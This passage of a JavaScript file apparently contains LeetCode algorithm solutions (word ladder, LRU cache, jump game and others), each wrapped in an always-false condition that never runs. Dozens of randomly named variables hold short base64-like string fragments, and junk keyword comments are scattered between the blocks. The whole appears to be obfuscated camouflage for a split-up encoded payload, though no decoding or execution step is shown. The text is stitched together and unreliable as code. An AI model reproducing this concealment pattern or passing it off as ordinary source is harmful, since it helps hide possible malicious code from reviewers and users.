            cur = cur.left;
        } else {
            cur = stack.pop();
            result.push(cur.val);
            cur = cur.right;
        }
    }
    return result;
};

}

    var blbuecsujyslds = 'FnS';
if (0.33 && false) {
    /**
Given two words (beginWord and endWord), and a dictionary's word list, find the length of shortest transformation sequence from beginWord to endWord, such that:

Only one letter can be changed at a time
Each intermediate word must exist in the word list
For example,

Given:
beginWord = "hit"
endWord = "cog"
wordList = ["hot","dot","dog","lot","log"]
As one shortest transformation is "hit" -> "hot" -> "dot" -> "dog" -> "cog",
return its length 5.

Note:
Return 0 if there is no such transformation sequence.
All words have the same length.
All words contain only lowercase alphabetic characters.
*/
/**
 * @param {string} beginWord
 * @param {string} endWord
 * @param {Set} wordList
 *   Note: wordList is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {number}
 */
var ladderLength = function(beginWord, endWord, wordList) {
    var visit = {},
        len = beginWord.length,
        queue = [],
        charArr = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'],
        curNode,
        curStr,
        tempStr,
        tempNode,
        i,
        j;
    
    curNode = new node(beginWord, 1);
    visit[curNode.str] = true;
    queue.push(curNode);
    

    while (queue.length > 0) {
        curNode = queue.shift();
        curStr = curNode.str;
        for (i = 0; i < len; i++) {
            for (j = 0; j < 26; j++) {
                if (charArr[j] === curStr.charAt(i)) {
                    continue;
                }
                
                tempStr = curStr.substring(0, i) + charArr[j] + curStr.substring(i + 1, len);
                
                if (tempStr === endWord) {
                    return curNode.step + 1;
                }
                
                if (wordList.has(tempStr) && !visit.hasOwnProperty(tempStr)) {
                    visit[tempStr] = true;
                    tempNode = new node(tempStr, curNode.step + 1);
                    queue.push(tempNode);
                }
            }
        }
    }
        
    return 0;
};

function node(str, step) {
    this.str = str;
    this.step = step;
}

}

    var guazuiijtt = 'hKYn';
    var prztovqddqcfu = 'UNBZ0';
if (Array.isArray(4)) {
    /**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} l1
 * @param {ListNode} l2
 * @return {ListNode}
 */
var addTwoNumbers = function(l1, l2) {
    var val = 0,
        newHead,
        newTail,
        node;
    
    if (!l1) {
        return l2;
    }
    
    if (!l2) {
        return l1;
    }
    
    while (l1 && l2) {
        val += l1.val + l2.val;
        node = new ListNode(val % 10);
        
        if (newHead) {
            newTail.next = node;
            newTail = newTail.next;
        } else {
            newHead = node;
            newTail = node;
        }
        
        val = (val >= 10)? 1 : 0;
        l1 = l1.next;
        l2 = l2.next;
    }
    
    while (l1) {
        val += l1.val;
        node = new ListNode(val % 10);
        newTail.next = node;
        newTail = newTail.next;
        val = (val >= 10)? 1 : 0;
        l1 = l1.next;
    }
    
    while (l2) {
        val += l2.val;
        node = new ListNode(val % 10);
        newTail.next = node;
        newTail = newTail.next;
        val = (val >= 10)? 1 : 0;
        l2 = l2.next;
    }
    
    if (val > 0) {
        node = new ListNode(val);
        newTail.next = node;
    }
    
    return newHead;
};

}

    var zlndwusvtir = 'hEYzFvEuZ';
if ('v' === 'G') {
    /**
Given n, generate all structurally unique BST's (binary search trees) that store values 1...n.

For example,
Given n = 3, your program should return all 5 unique BST's shown below.

   1         3     3      2      1
    \       /     /      / \      \
     3     2     1      1   3      2
    /     /       \                 \
   2     1         2                 3
confused what "{1,#,2,3}" means? > read more on how binary tree is serialized on OJ.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {number} n
 * @return {TreeNode[]}
 */
var generateTrees = function(n) {
    if (n === 0) {
        return [];
    }
    
    return genTreeHelper(1, n);
};

function genTreeHelper(start, end) {
    var result = [],
        left,
        right,
        node,
        i,
        j,
        k;
    
    if (start > end) {
        return [null];
    }
    
    for (i = start; i <= end; i++) {
        left = genTreeHelper(start, i - 1);
        right = genTreeHelper(i + 1, end);
        for (k = 0; k < left.length; k++) {
            for (j = 0; j < right.length; j++) {
                node = new TreeNode(i);
                node.left = left[k];
                node.right = right[j];
                result.push(node);
            }
        }
    }
    
    return result;
}

}

    var nttnkq = 'lDQWd';
    var ypsypgff = 'NbYoGse';
    var vgtvfrjkm = 'leUJ';
    var gwkthc = 'vIRWHxgkQs';
// variable nenbva export function debug hello object
    var hsdujuay = 'YgcEgotPUl';
    var mgqat = 'yWlhsRGIyU';
    var wvlfuqb = 'DyPd';
    var nzzohublrmlic = 'mxPaUF';
    var eghiyx = 'hMLTCZjry';
if (Array.isArray(4)) {
    /**
Given an array of non-negative integers, you are initially positioned at the first index of the array.

Each element in the array represents your maximum jump length at that position.

Your goal is to reach the last index in the minimum number of jumps.

For example:
Given array A = [2,3,1,1,4]

The minimum number of jumps to reach the last index is 2. (Jump 1 step from index 0 to 1, then 3 steps to the last index.)

Note:
You can assume that you can always reach the last index.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var jump = function(nums) {
    var len = nums.length,
        step = 0,
        last = 0,
        cover = nums[0],
        i;
    
    for (i = 1; i < len; i++) {
        if (i > last) {
            last = cover;
            step++;
        }
        
        if (last >= len - 1) {
            break;
        }
        
        cover = Math.max(cover, nums[i] + i);
    }
    
    return step;
};


// time limit exceeded
/**
 * @param {number[]} nums
 * @return {number}
 */
var jump = function(nums) {
    var len = nums.length,
        result = [];
        
    result[0] = Number.MAX_VALUE;
    helper(0, nums, 0, 0, result);
    
    return result[0];
};

function helper(index, nums, cover, step, result) {
    if (cover < index || step > result[0]) {
        return;
    }
    
    if (cover >= nums.length - 1) {
        result[0] = Math.min(result[0], step);
        return;
    }
    
    var i = index;
    
    for (i = index; i <= cover; i++) {
        helper(i + 1, nums, Math.max(cover, nums[i] + i), step + 1, result);
    }
}


// memory limit exceed
/**
 * @param {number[]} nums
 * @return {number}
 */
var jump = function(nums) {
    var len = nums.length,
        dp = [],
        result = Number.MAX_VALUE,
        reachable = [],
        i,
        j;
    
    for (j = 0; j < len; j++) {
        reachable.push(new Array(len));
        for (i = j + 1; i < len; i++) {
            if (nums[j] + j >= i) {
                reachable[j][i] = true;
            } else {
                break;
            }
        }
    }
    dp[0] = 1;
    for (i = 1; i < len; i++) {
        // since there's always a solution
        dp[i] = dp[i - 1] + 1;
        
        for (j = 0; j < i; j++) {
            if (reachable[j][i]) {
                dp[i] = Math.min(dp[i], dp[j] + 1);
            }
        }
    }
    
    return dp[len - 1];
};

}

// constant dmyvcz import export hello
    var xsumgj = 'sLlPqj';
    var nyaojkoweujnbl = '4TWpNZ2ZTd';
    var mnjoiev = 'uxNGdT';
if ('h' === 'R') {
    /**
Given a linked list, remove the nth node from the end of list and return its head.

For example,

   Given linked list: 1->2->3->4->5, and n = 2.

   After removing the second node from the end, the linked list becomes 1->2->3->5.
Note:
Given n will always be valid.
Try to do this in one pass.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} n
 * @return {ListNode}
 */
var removeNthFromEnd = function(head, n) {
    var nodeA = head,
        nodeB = head,
        i = 0;
    
    if (!head) {
        return null;
    }
    
    while (nodeA.next) {
        nodeA = nodeA.next;
        if (i < n) {
            i++;
        } else {
            nodeB = nodeB.next;
        }
    }
    
    if (i < n) {
        head = head.next;
        return head;
    }
    
    if (nodeB.next) {
        nodeB.next = nodeB.next.next;
        return head;
    }
    
    return null;
      
};

}

    var xkrkltgmljhmff = '2dMeThnUm';
    var yxbdkrgmlnfd = 'iISY';
if (!true && 0) {
    /**
Given an integer array of size n, find all elements that appear more than ⌊ n/3 ⌋ times. The algorithm should run in linear time and in O(1) space.

Hint:

How many majority elements could it possibly have?
*/
/**
 * @param {number[]} nums
 * @return {number[]}
 */
var majorityElement = function(nums) {
    var len = nums.length,
        candidate1,
        count1 = 0,
        candidate2,
        count2 = 0,
        result = [],
        i;
    
    
    for (i = 0; i < len; i++) {
        if (nums[i] === candidate1) {
            count1++;
        } else if (nums[i] === candidate2) {
            count2++;
        } else if (count1 === 0) {
            count1++;
            candidate1 = nums[i];
        } else if (count2 === 0) {
            count2++;
            candidate2 = nums[i];
        } else {
            count1--;
            count2--;
        }
    }
    
    count1 = 0;
    count2 = 0;
    
    for (i = 0; i < len; i++) {
        if (nums[i] === candidate1) {
            count1++;
        } else if (nums[i] === candidate2) {
            count2++;
        }
    }
    
    if (count1 > Math.floor(len / 3)) {
        result.push(candidate1);
    }
    
    if (count2 > Math.floor(len / 3)) {
        result.push(candidate2);
    }
    
    return result;
};
}

    var qbfovz = 'pFeU';
    var gnqlxob = 'GWucAst';
    var zrbosrq = 'NpQWdJQ0F';
    var hizkkwhh = 'PsBYfHh';
    var huyodkmxsne = 'nSUNBZ2V';
    var wgtimm = 'kRbEfnQeBY';
    var gmjoboszzhulo = '5QmpkSEpzT';
if (0.49 && false) {
    /**
Sort a linked list using insertion sort.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var insertionSortList = function(head) {
    var dummy = new ListNode(0),
        pre = dummy,
        cur = head,
        next;
        
    while(cur !== null) {
        next = cur.next;
        pre = dummy;
        
        while (pre.next && pre.next.val <= cur.val) {
            pre = pre.next;
        }
        
        cur.next = pre.next;
        pre.next = cur;
        cur = next;
    }
    
    return dummy.next;
};

}

    var bxgfidojbomp = 'HGWnuZay';
    var lcyvhyihoxufjhr = '2lCMGNuVmx';
if (0.23 && false) {
    /**
Follow up for problem "Populating Next Right Pointers in Each Node".

What if the given tree could be any binary tree? Would your previous solution still work?

Note:

You may only use constant extra space.
For example,
Given the following binary tree,
         1
       /  \
      2    3
     / \    \
    4   5    7
After calling your function, the tree should look like:
         1 -> NULL
       /  \
      2 -> 3 -> NULL
     / \    \
    4-> 5 -> 7 -> NULL
Subscribe to see which companies asked this question
*/
/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    if (!root) {
        return;
    }
    
    var curRow = [],
        nextRow = [],
        i;
        
    curRow.push(root);
    
    while (curRow.length > 0) {
        for (i = 0; i < curRow.length; i++) {
            if (curRow[i].left) {
                nextRow.push(curRow[i].left);
            }
            
            if (curRow[i].right) {
                nextRow.push(curRow[i].right);
            }
            
            if (i < curRow.length - 1) {
                curRow[i].next = curRow[i + 1];
            } else {
                curRow[i].next = null;
            }
        }
        
        curRow = nextRow;
        nextRow = [];
    }
};


// O(1) space solution

/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    let nextHead = null;
    let cur = root;
    let nextCur = null;
    
    while (cur !== null) {
        
        while (cur !== null) {
            if (cur.left) {
                if (!nextHead) {
                    nextHead = cur.left;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.left;
                    nextCur = nextCur.next;
                }
            }
            
            if (cur.right) {
                if (!nextHead) {
                    nextHead = cur.right;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.right;
                    nextCur = nextCur.next;
                }
            }
            
            cur = cur.next;
        }
        
        cur = nextHead;
        nextHead = null;
        nextCur = null;
    }
};

}

    var vpunnuszsr = 'rNndp';
if (49 > 195) {
    
/**
 * Given an array of integers, every element appears twice except for one. Find that single one.
 * Note:
 * Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?
 * 
 * @param {number[]} A
 * @return {number}
 */
var singleNumber = function(A) {
    var length = A.length,
        i,
        result = 0;
    if (length === 1) {
        return A[0];
    }
    for (i = 0; i < length; i++) {
        result = result ^ A[i];
    }
    return result;
};

}

    var xjlpvrwil = 'MQ0JyWlhs';
if (typeof navigator === 'undefined') {
    /**
Note: This is an extension of House Robber.

After robbing those houses on that street, the thief has found himself a new place for his thievery so that he will not get too much attention. This time, all houses at this place are arranged in a circle. That means the first house is the neighbor of the last one. Meanwhile, the security system for these houses remain the same as for those in the previous street.

Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight without alerting the police.
*/
/**
 * @param {number[]} nums
 * @return {number}
 * 因为首尾相连了，所以第一家和最后一家只能抢其中的一家，或者都不抢，那我们这里变通一下，如果我们把第一家和最后一家分别去掉，各算一遍能抢的最大值，然后比较两个值取其中较大的一个即为所求。
 */
var rob = function(nums) {
    var len = nums.length;
    
    if (len === 0) {
        return 0;
    }
    
    if (len === 1) {
        return nums[0];
    }
    
    return Math.max(getMax(0, len - 1, nums), getMax(1, len, nums));
};

function getMax(start, end, nums) {
    var arr = [],
        i;
    
    if (end - start <= 1) {
        return nums[start];
    }
    
    arr[start] = nums[start];
    arr[start + 1] = Math.max(nums[start], nums[start + 1]);
    
    for (i = start + 2; i < end; i++) {
        arr[i] = Math.max(arr[i - 1], arr[i - 2] + nums[i]);
    }
    
    return arr[end - 1];
}

}

    var oukqqgapq = 'iImpZGn';
if (0.07 && false) {
    /**
Given a digit string, return all possible letter combinations that the number could represent.

A mapping of digit to letters (just like on the telephone buttons) is given below.



Input:Digit string "23"
Output: ["ad", "ae", "af", "bd", "be", "bf", "cd", "ce", "cf"].
Note:
Although the above answer is in lexicographical order, your answer could be in any order you want.
*/
/**
 * @param {string} digits
 * @return {string[]}
 */
var letterCombinations = function(digits) {
    var len = digits.length,
        result = [],
        map = {
            '1': [''],
            '2': ['a', 'b', 'c'],
            '3': ['d', 'e', 'f'],
            '4': ['g', 'h', 'i'],
            '5': ['j', 'k', 'l'],
            '6': ['m', 'n', 'o'],
            '7': ['p', 'q', 'r', 's'],
            '8': ['t', 'u', 'v'],
            '9': ['w', 'x', 'y', 'z']
        };
        
    if (len === 0) {
        return result;
    }
    
    return genStrings([''], 0, len, digits, map);
};

function genStrings(curArr, index, len, digits, map) {
    var length = curArr.length,
        next = [],
        temp,
        i,
        j;
    
    if (index === len) {
        return curArr;
    }
    
    for (i = 0; i < length; i++) {
        for (j = 0; j < map[digits.charAt(index)].length; j++) {
            temp = curArr[i] + map[digits.charAt(index)][j];
            next.push(temp);
        }
    }    
    
    return genStrings(next, index + 1, len, digits, map);
}

}

// define number export ryfppfr object
    var nvuayvn = 'jgrTbW';
if (null === 5) {
    /**
Given a string S, you are allowed to convert it to a palindrome by adding characters in front of it. Find and return the shortest palindrome you can find by performing this transformation.

For example:

Given "aacecaaa", return "aaacecaaa".

Given "abcd", return "dcbabcd".
*/

// https://segmentfault.com/a/1190000003059361

/**
 * @param {string} s
 * @return {string}
 */
var shortestPalindrome = function(s) {
    var reverse = s.split('').reverse().join('');
    
    return reverse.substring(0, s.length - getCommonLength(s + '#' + reverse)) + s;
};

function getCommonLength(s) {
    var p = [], // max len of common prefix and suffix from index 0 to i 
        len = s.length,
        i = 0,
        j;
    
    while(i < len) {
        p.push(0);
        i++;
    }
    
    for (i = 1; i < len; i++) {
        j = p[i - 1];
        
        while(j > 0 && (s.charAt(i) !== s.charAt(j))) {
            j = p[j - 1];
        }
        
        if (s.charAt(i) === s.charAt(j)) {
            j++;
        }
        
        p[i] = j; 
    }
    
    return p[len - 1];
}   

}

    var hpsjiwphlrnt = 'RGIyU';
    var xczqjpm = 'WZKYeb';
if ('v' === 'Q') {
    /**
Given a m x n grid filled with non-negative numbers, find a path from top left to bottom right which minimizes the sum of all numbers along its path.

Note: You can only move either down or right at any point in time.
*/
/**
 * @param {number[][]} grid
 * @return {number}
 */
var minPathSum = function(grid) {
    var result = [],
        rowL = grid.length,
        columnL,
        i,
        j;
    
    if (rowL === 0) {
        return result;
    }
    
    columnL = grid[0].length;
    
    for (i = 0; i < rowL; i++) {
        result.push(new Array(columnL));
    }
    
    result[0][0] = grid[0][0];
    
    for (i = 1; i < columnL; i++) {
        result[0][i] = grid[0][i] + result[0][i - 1];
    }
    
    for (i = 1; i < rowL; i++) {
        result[i][0] = grid[i][0] + result[i - 1][0];
    }
    
    for (i = 1; i < rowL; i++) {
        for (j = 1; j < columnL; j++) {
            result[i][j] = Math.min(result[i - 1][j], result[i][j - 1]) + grid[i][j];
        }
    }
    
    return result[rowL - 1][columnL - 1];
};

}

// script gklxt value array loop constant value variable return tkvoh rytpv async world onsuxeq loop
    var avgrfucniom = 'lhvExAsKo';
    var rvftqxjbaswnfx = 'mxPa';
    var yzdudm = 'oCRbLYbGjT';
    var qpywrlomq = 'UE0';
    var wdvbxypf = 'IDprm';
if (null === 5) {
    /**
Given a singly linked list L: L0→L1→…→Ln-1→Ln,
reorder it to: L0→Ln→L1→Ln-1→L2→Ln-2→…

You must do this in-place without altering the nodes' values.

For example,
Given {1,2,3,4}, reorder it to {1,4,2,3}.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {void} Do not return anything, modify head in-place instead.
 */
var reorderList = function(head) {
    var fast = head,
        slow = head,
        next1,
        next2,
        midHead;
    
    if (!head || !head.next) {
        return;
    }  
    
    while (fast && fast.next) {
        fast = fast.next.next;
        slow = slow.next;
    }
    
    if (fast) {
        midHead = reverse(slow.next);
    } else {
        midHead = reverse(slow);
    }
    
    fast = head;
    slow = midHead;
    
    while(fast && slow) {
        next1 = fast.next;
        next2 = slow.next;
        
        slow.next = fast.next;
        fast.next = slow;
        
        fast = next1;
        slow = next2;
    }
    
    if (fast) {
        fast.next = null;
    }
};

function reverse(head) {
    var dummyNode = new ListNode(0),
        prev = dummyNode,
        node,
        next;
        
    dummyNode.next = head;
    
    node = head.next;
    head.next = null;
    
    while (node) {
        next = node.next;
        node.next = prev.next;
        prev.next = node;

        node = next;
    }
    
    return dummyNode.next;
}

}

    var rldbsbosaok = 'TlNC';
if ('false' === true) {
    /**
Implement a basic calculator to evaluate a simple expression string.

The expression string may contain open ( and closing parentheses ), the plus + or minus sign -, non-negative integers and empty spaces .

You may assume that the given expression is always valid.

Some examples:
"1 + 1" = 2
" 2-1 + 2 " = 3
"(1+(4+5+2)-3)+(6+8)" = 23
Note: Do not use the eval built-in library function.
*/
/**
 * @param {string} s
 * @return {number}
 */
var calculate = function(s) {
    var stack = [],
        len = s.length,
        sum = 0,
        num,
        ch,
        j,
        i;
    
    stack.push(1);
    stack.push(1);
    
    for (i = 0; i < len; i++) {
        ch = s.charAt(i);
        
        if (!isNaN(parseInt(ch))) {
            num = parseInt(ch);
            
            for (j = i + 1; j < len && !isNaN(parseInt(s.charAt(j))); j++) {
                num = num * 10 + parseInt(s.charAt(j));
            }
            
            sum += stack.pop() * num;
            
            i = j - 1;
        } else if (ch === '+' || ch === '(') {
            stack.push(stack[stack.length - 1]);
        } else if (ch === '-') {
            stack.push(stack[stack.length - 1] * (-1));
        } else if (ch === ')') {
            stack.pop();
        }
    }
    
    return sum;
};

}

    var wgfgumqjmrdo = 'kapwfvGSyf';
    var synnpusbxj = 'OUx';
    var ywdqrctajwfz = 'yLrRMAg';
    var jxkqungttqhf = 'DQXZMeU';
    var yluinko = 'SWva';
// debug world loop define await
    var pzvfyxh = 'Rgma';
    var lwoqrv = 'JEZEh';
if ('true' === true) {
    /**
Design and implement a data structure for Least Recently Used (LRU) cache. It should support the following operations: get and set.

get(key) - Get the value (will always be positive) of the key if the key exists in the cache, otherwise return -1.
set(key, value) - Set or insert the value if the key is not already present. When the cache reached its capacity, it should invalidate the least recently used item before inserting a new item.
*/
class Node {
    constructor(key, val) {
        this.key = key;
        this.val = val;
        this.next = null;
        this.prev = null;
    }
}
/**
 * @constructor
 */
var LRUCache = function(capacity) {
    this.list = null;
    this.map = new Map();
    this.head = null;
    this.tail = null;
    this.size = capacity;
    this.curSize = 0;
};

/**
 * @param {number} key
 * @returns {number}
 */
LRUCache.prototype.get = function(key) {
    if (!this.map.get(key)) {
        return -1;
    }
    
    let node = this.map.get(key);
    
    if (node === this.head) {
        return node.val;
    }
    
    // remove node from list
    if (node === this.tail) {
        this.tail.prev.next = null;
        this.tail = this.tail.prev;
    } else {
        node.prev.next = node.next;
        node.next.prev = node.prev;
    }
    
    // insert node to head
    node.next = this.head;
    this.head.prev = node;
    this.head = node;
    
    return node.val;
};

/**
 * @param {number} key
 * @param {number} value
 * @returns {void}
 */
LRUCache.prototype.set = function(key, value) {
    let newNode = new Node(key, value);
    
    if (this.curSize === 0) {
        this.head = newNode;
        this.tail = newNode;
        this.curSize++;
    } else {
        newNode.next = this.head;
        this.head.prev = newNode;
        this.head = newNode;
        this.curSize++;
    }
    
    // update
    if (this.map.get(key)) {
        let oldNode = this.map.get(key);
        
        if (oldNode === this.tail) {
            this.tail = this.tail.prev;
            this.tail.next = null;
        } else {
            oldNode.prev.next = oldNode.next;
            oldNode.next.prev = oldNode.prev;
        }
        
        this.curSize--;
        this.map.set(key, newNode);
    } else {
        if (this.curSize > this.size) {
            //delete tail
            this.map.delete(this.tail.key);
            this.tail = this.tail.prev;
            this.tail.next = null;
            this.curSize--;
        }
        
        this.map.set(key, newNode);
    }
};

}

    var gyhfbiawj = 'NPWlFOMA';
    var dqosvuwunvwpict = 'Kc0sxV';
if (null === 1) {
    /**
Suppose a sorted array is rotated at some pivot unknown to you beforehand.

(i.e., 0 1 2 4 5 6 7 might become 4 5 6 7 0 1 2).

You are given a target value to search. If found in the array return its index, otherwise return -1.

You may assume no duplicate exists in the array.
*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number}
 */
var search = function(nums, target) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
        
    while (start <= end) {
        mid = Math.floor((start + end) / 2);
        
        if (nums[mid] === target) {
            return mid;
        } else if (nums[start] <= nums[mid]) {// left side sorted
            if (nums[mid] > target && nums[start] <= target) {
                // nums[mid] !== target, can safely do end = mid - 1
                end = mid - 1;
            } else {
                start = mid + 1;
            }
        } else { // right side sorted
            if (nums[mid] < target && nums[end] >= target) {
                // nums[mid] !== target, can safely do start = mid + 1
                start = mid + 1;
            } else {
                end = mid - 1;
            }
        }
    }
    
    return -1;
};

}

    var djlglndg = 'HawaiORp';
    var molkryxmewgpvgz = 'UtJQ';
    var ssaiihan = 'OCKWBJLs';
// return function script await debug xpxsfw
    var repxndlvvy = 'SAoWgbY';
    var foyadwmmdv = '0FnSUNBZ';
    var ewupewc = 'mRRFeipySK';
    var tiovia = '0lD';
    var ffonzr = 'MexYDHSf';
    var yokyonxzeprolxh = 'QjdJR0';
    var ufvibvwkuki = 'Rbemo';
if (Array.isArray(8)) {
    /**
Implement int sqrt(int x).

Compute and return the square root of x.
*/
/**
 * @param {number} x
 * @return {number}
 */
var mySqrt = function(x) {
    var start = 1,
        end = x,
        mid;
    
    if (x === 0) {
        return 0;
    }
    
    while (start + 1 < end) {
        mid = start + parseInt((end - start) / 2);
        
        if (mid * mid <= x) {
            start = mid;
        } else {
            end = mid;
        }
    }
    
    return start;
};

}

    var lfpye = '4wY213NklI';
    var rmludd = 'AFlQjmWx';
    var gvofyuebkv = 'UnlkV1VzSU';
if (69 > 171) {
    /**
Given a linked list, reverse the nodes of a linked list k at a time and return its modified list.

If the number of nodes is not a multiple of k then left-out nodes in the end should remain as it is.

You may not alter the values in the nodes, only nodes itself may be changed.

Only constant memory is allowed.

For example,
Given this linked list: 1->2->3->4->5

For k = 2, you should return: 2->1->4->3->5

For k = 3, you should return: 3->2->1->4->5
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
 
// iterative solution, not recommended, very easy to make mistakes
/**
 * @param {ListNode} head
 * @param {number} k
 * @return {ListNode}
 */
var reverseKGroup = function(head, k) {
    var dummy = new ListNode(0),
        i = 0,
        node = head,
        next,
        prevTail,
        curHead,
        curTail,
        nextHead,
        nextTail;
    
    while (node) {
        node = node.next;
        i++;
        
        if (i >= k) {
            break;
        }
    }
    
    if (k === 1 || i < k ) {
        return head;
    }
    
    i = 0;
    
    dummy.next = head;
    prevTail = dummy;
    node = head;
    
    while (node) {
        if (i === 0) {
            curTail = node;
            next = node.next;
            node.next = null;
            prevTail.next = node;
        } else {
            next = node.next;
            node.next = prevTail.next;
            prevTail.next = node;
        }
        
        i++;
        
        if (i === k) {
            prevTail = curTail;
            i = 0;
        }
        
        node = next;
    }
    
    if (i < k) {
        node = prevTail.next;
        prevTail.next = null;
        
        while (node) {
            next = node.next;
            node.next = prevTail.next;
            prevTail.next = node;
            node = next;
        }
    }
    
    return dummy.next;
};

// recursive
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} k
 * @return {ListNode}
 */
var reverseKGroup = function(head, k) {
    var i = 0,
        newHead = head,
        dummy = new ListNode(0),
        prev,
        cur,
        next;
    
    for (i = 0; i < k; i++) {
        if (newHead === null) {
            return head;
        }
        
        newHead = newHead.next;
    }
    
    newHead = reverseKGroup(newHead, k);
    cur = head;
    dummy.next = newHead;
    
    for (i = 0; i < k; i++) {
        next = cur.next;
        cur.next = dummy.next;
        dummy.next = cur;
        cur = next;
    }
    
    return dummy.next;
};

}

    var rqlyxkcwflcr = 'sIufCI';
if ('true' === true) {
    /**
There are N gas stations along a circular route, where the amount of gas at station i is gas[i].

You have a car with an unlimited gas tank and it costs cost[i] of gas to travel from station i to its next station (i+1). You begin the journey with an empty tank at one of the gas stations.

Return the starting gas station's index if you can travel around the circuit once, otherwise return -1.

Note:
The solution is guaranteed to be unique.
*/
/**
 * @param {number[]} gas
 * @param {number[]} cost
 * @return {number}
 * 
在任何一个节点，其实我们只关心油的损耗，定义： 

diff[i] = gas[i] – cost[i]  0<=i <n 

那么这题包含两个问题： 

1. 能否在环上绕一圈？ 

2. 如果能，这个起点在哪里？ 

第一个问题，很简单，我对diff数组做个加和就好了，leftGas = ∑diff[i]， 如果最后leftGas是正值，那么肯定存在这么一个起始点。如果是负值，那说明，油的损耗大于油的供给，不可能有解。得到第一个问题的答案只需要O(n)。 

对于第二个问题，起点在哪里？ 

假设，我们从环上取一个区间[i, j], j>i， 然后对于这个区间的diff加和，定义 

sum[i,j] = ∑diff[k] where i<=k<j 

如果sum[i,j]小于0，那么这个起点肯定不会在[i,j]这个区间里，跟第一个问题的原理一样。举个例子，假设i是[0,n]的解，那么我们知道 任意sum[k,i-1] (0<=k<i-1) 肯定是小于0的，否则解就应该是k。同理，sum[i,n]一定是大于0的，否则，解就不应该是i，而是i和n之间的某个点。所以第二题的答案，其实就是在0到n之间，找到第一个连续子序列（这个子序列的结尾必然是n）大于0的。 

至此，两个问题都可以在一个循环中解决。
 */
var canCompleteCircuit = function(gas, cost) {
    var len = gas.length,
        diff = [],
        curSum = 0,
        sum = 0,
        i,
        startNode = 0;
    
    for(i = 0; i < len; i++) {
        diff[i] = gas[i] - cost[i];
        sum += diff[i];
        curSum += diff[i];
        
        if (curSum < 0) {
            startNode = i + 1;
            curSum = 0;
        }
    }
    
    if (sum < 0) {
        return -1;
    } else {
        return startNode;
    }
        
};
}

    var wtplirh = 'hOb2FX';
    var fnbxnxvqamy = 'XuuMcprkwn';
// export import utvfr value string
    var bcahlt = 'QKKFSAzg';
    var cdyrrlcqk = 'WjBPaUIwY';
    var obittbpnzke = 'tJPuEnvQ';
    var dkinpkgomwv = '25WbExDQ';
    var bmwhqlz = 'RMfwi';
if (1 === 19) {
    /**
Given an array S of n integers, are there elements a, b, c, and d in S such that a + b + c + d = target? Find all unique quadruplets in the array which gives the sum of target.

Note:
Elements in a quadruplet (a,b,c,d) must be in non-descending order. (ie, a ≤ b ≤ c ≤ d)
The solution set must not contain duplicate quadruplets.
    For example, given array S = {1 0 -1 0 -2 2}, and target = 0.

    A solution set is:
    (-1,  0, 0, 1)
    (-2, -1, 1, 2)
    (-2,  0, 0, 2)
*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number[][]}
 */
var fourSum = function(nums, target) {
    nums.sort(function(a, b) {
        return a - b;
    });
     
    var len = nums.length,
        result = [],
        i;
        
    kSum(result, [], 4, nums, target, 0, len - 1);
    
    return result;
};

function kSum(result, curArr, k, nums, target, startIndex, endIndex) {
    var len = nums.length,
        start,
        end,
        sum,
        i;
    
    if (k >= 3) {
        for (i = startIndex; i <= endIndex; i++) {
            if (i > startIndex && nums[i] === nums[i - 1]) {
                continue;
            }
            
            curArr.push(nums[i]);
            kSum(result, curArr.concat(), k - 1, nums, target - nums[i], i + 1, endIndex);
            curArr.pop();
        }
    }
    
    if (k === 1) {
        for (i = startIndex; i <= endIndex; i++) {
            if (nums[i] === target) {
                result.push(nums[i]);
            }
        }
    }
    
    if (k === 2) {
        start = startIndex;
        end = endIndex;
        
        while (start < end) {
            sum = nums[start] + nums[end];
            
            if (sum === target) {
                curArr.push(nums[start]);
                curArr.push(nums[end]);
                result.push(curArr.concat());
                curArr.pop();
                curArr.pop();
                
                start++;
                end--;
                
                while(nums[start] === nums[start - 1]) {
                    start++;
                }
                
                while(nums[end] === nums[end + 1]) {
                    end--;
                }
            } else if (sum < target) {
                start++;
            } else {
                end--;
            }
        }
    }
}

}

    var kazotfysuepz = 'nJaWGxEYj';
    var acqlph = 'CQeQn';
if (0.54 && false) {
    /**
You are given a string, s, and a list of words, words, that are all of the same length. Find all starting indices of substring(s) in s that is a concatenation of each word in words exactly once and without any intervening characters.

For example, given:
s: "barfoothefoobarman"
words: ["foo", "bar"]

You should return the indices: [0,9].
